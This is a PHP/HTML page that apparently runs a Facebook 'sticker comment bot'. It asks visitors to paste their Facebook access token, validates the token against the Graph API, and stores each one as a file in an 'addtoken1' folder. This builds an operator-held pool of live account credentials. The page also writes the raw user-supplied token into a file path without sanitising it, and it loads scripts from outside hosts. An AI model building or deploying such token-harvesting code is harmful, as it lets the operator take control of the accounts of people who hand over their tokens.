<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><meta charset="utf-8"/>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>NEW BOT | Sticker Comment Bot</title>
<link rel="stylesheet" type="text/css" href="stylesheet.css" media="all,handheld"/>
<link rel="stylesheet" type="text/css" href="table.css" media="all,handheld"/>
<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet"/>
<link rel="shortcut icon" type="image/png" href="https://phamvinh.com/wp-content/uploads/2017/10/icon-cuoi-lon-ngoac-mieng.jpg"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

<?php
$yx=opendir('addtoken1');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> addtoken1($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function addtoken1($access){
if(!is_dir('addtoken1')){
mkdir('addtoken1');
}
$a=fopen('addtoken1/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<center><font color="red">Nhập Token Chết Thì Chạy ccc Lấy Lại token đi !</font></center>';
$this->form();
}

public function form(){
$on= file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/user.php');

echo'
<div id="header"><script src="header.js"></script><hr></div>
<center><marquee direction="left" width="60%"> Arman (Amee)<font color ="red">❤️</font> And <font color ="red">❤️</font> Hassan Khan</marquee></center></br>
<hr width="60%"></br>
<div id="profile">
<div class="css">
<a>
<img src="https://graph.facebook.com/100013277984400/picture?type=large" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a></div></div></br>
<div id="center">
<a href="http://hasan-token.tk" target="_blank"><input class="button" type="button" value="Get Token"></a></br></br>

<form action="" method="POST">
<input class="search" style="width:65%" type="text" name="access_token" placeholder="Put Your Token Here" required></br>
<input class="submit" type="submit" name="saveFile" value="Save"></form></div>';
}

public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me?fields=id,name&access_token='.$access),true);
for($i=0;$i<count($feed[data]);$i++){
$id1 = $feed[data][$i][id];
}
echo'
<div id="center">
<font size="40px"> Token Saved! </font></br>
[<a href="index.php" value="Click Here">Click Here</a>] to go back to the home page.</div>';
}

private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
));
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
<div id="footer">
Users <font color="yellow"> <?php include 'user.php';?> </font></br>
Created By <a target="_blank" href="https://m.facebook.com/100013277984400">Arman Khan </a></br></div>
</body>
</html>


<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.5";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<script type="text/javascript" src="http://cdn.vietdesigner.net/data/codes/snowstorm.js"></script>
<script language="javascript" type="text/javascript" src="http://cc-lemon.yn.lt/lovemoon/Dpadhome.js"></script>
<div class="kddtop"> <div class="kddtut"> <p>

<b>Arman Khan & Hassan Khan</b><br>
<img src="https://graph.facebook.com/100013277984400/picture?type=large" alt="Profile" style="width:250px; height:250px;border: 2px;border-radius: 50%;" data-pagespeed-url-hash="1820703895" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
<br><b>WELCOME TO BOT STICKER COMMENT </b><br><br>
<b>Powered by : Arman</b><br>
 <b></b><br><style>
  .kddtop {
       left:16px;

      width: 350px;
  min-height:180px;
  background: transparent;
  margin: 0 auto;
  position: fixed;
  font-family:Arial, sans-serif !important;
  border-radius:3px;
  -webkit-border-radius:3px;
  bottom: 16px;
  overflow: hidden;box-shadow: 0px 1px 4px transparent;
z-index:900;}

.kddtop p{width:0px;height:0px;overflow:hidden;opacity:0;position:relative;padding:16px 0 0 20px;z-index:5;margin:0 0 0 0;
color:rgba(0,0,0,0);}
.kddtop:hover p{display:block;
width:100%;height:100%;opacity:1;color:#fff;
  transition:opacity 1s 0.4s ease;
}
.kddtop:before {
  content: "♥";
  position: absolute;
  line-height: 1500px;
    text-align: center;
    color: #fff;
    font-weight: bold;
    font-size: 1000px;
  z-index:1;
  width: 1500px;
  height: 1500px;
  background: #F44336;
  border-radius: 50%;
  top: 100%;
  left: 50%;
  -webkit-transform: translate3d(-50%, -50%, 0) scale(0.035);
  transform: translate3d(-50%, -50%, 0) scale(0.035);
  -webkit-animation: .5s bounce infinite alternate-reverse;
  animation: .5s bounce infinite alternate-reverse;
  -webkit-transition: .5s -webkit-transform ease, .5s color ease;
  transition: .5s transform ease, .5s color ease;
}
.kddtop:after {
  content: "";
  position: absolute;
  left: 133px;
  right: 133px;
  bottom: 0;
  height: 15px;
  background: rgba(0, 0, 0, 0.5);
  border-radius: 50%;
  -webkit-transition: .3s opacity ease;
  transition: .3s opacity ease;
  -webkit-animation: .5s shadow infinite alternate-reverse;
  animation: .5s shadow infinite alternate-reverse;
}
.kddtop:hover {
  box-shadow: 0px 5px 4px rgba(0, 0, 0, 0.3);
  -webkit-transition: .5s all ease .25s;
  transition: .5s all ease .25s;
}
    .kddtop:hover:before { color: Black; top: 100%; -webkit-transform: translate3d(-50%, -50%, 0) scale(1); transform: translate3d(-50%, -50%, 0) scale(1); -webkit-transition: .3s top ease, .5s -webkit-transform ease .25s, .5s color ease .25s; transition: .3s top ease, .5s transform ease .25s, .5s color ease .25s; } </style> <style> .kddtop:hover:after { opacity: 0; } .kddtop:hover .kddtut:before { width: 50px; -webkit-transition: .3s all ease 1.25s; transition: .3s all ease 1.25s; } .kddtop .kddtut { padding: 0 35px 5px 0; box-sizing: border-box; display: block; position: relative; opacity: 1; text-align: center; } .kddtop .kddtut:before { content: ""; position: absolute; top: 0; left: 150px; rigth: 150px; width: 0px; height: 1px; background: black; } @-webkit-keyframes bounce { from { top: 93%; } to { top: 50%; } } @keyframes bounce { from { top: 93%; } to { top: 50%; } } @-webkit-keyframes shadow { from { height: 5px; } to { height: 20px; -webkit-transform: scale(0.3); transform: scale(0.3); } } @keyframes shadow { from { height: 5px; } to { height: 20px; -webkit-transform: scale(0.3); transform: scale(0.3); } }</style></p></div></div> 
 